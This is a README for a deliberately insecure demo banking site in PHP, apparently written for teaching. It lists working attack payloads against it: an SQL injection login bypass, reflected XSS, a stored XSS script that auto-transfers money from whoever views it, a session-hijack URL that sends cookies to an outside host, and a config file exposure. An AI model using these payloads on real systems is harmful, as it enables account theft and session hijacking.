# Crappy bank website

NOTICE! THIS IS A REPO FILLED WITH BAD PRACTICES AND IT WAS USED FOR A DEMO TO MY COLLEGUES. PLEASE DO NOT - I REPEAT - DO NOT USE THIS CODE ANYWHERE! 

## Before you start
Please first import the test data in the db.sql
To run the app just use the php command: `php -S localhost:8080`

Please note, Google Chrome uses an xss auditor. Really nice, but to get the hang of this, please disable it while testing with the following command: 
`/Applications/Google\ Chrome.app/Contents/MacOS/Google\ Chrome  --disable-xss-auditor`

# Hacks

## SQL Injection in login
`swijnberg' OR '1'='1`

## XSS account info
`http://localhost:8080/secret.php?page=account-info&account=NL15RABO037592641%3Cscript%3Ealert(123)%3C/script%3E`

## ID Enummeration account-info
You are able to ennumerate account id's and see other peoples account info.

## Funny stored XSS that drains the account of the one viewining it
```
<script>
document.getElementById(\'transferForm\').elements[0].value = \'NL15RABO037592641\';
document.getElementById(\'transferForm\').elements[1].value = \'1000000\';
document.getElementById(\'transferForm\').elements[2].value = \'Pwned!\';
document.getElementById(\'transferForm\').elements[3].click();</script>
```

## Session Hijack 
`http://localhost:8080/secret.php?name=Stef%3Cscript%3Edocument.location=%27http://somewhere.com/stef/kek-session.php?%27%2Bdocument.cookie;%3C/script%3E`

## arbitrairy file exposure / execution
`http://localhost:8080/secret.php?page=config.ini&account=NL15RABO037592641`
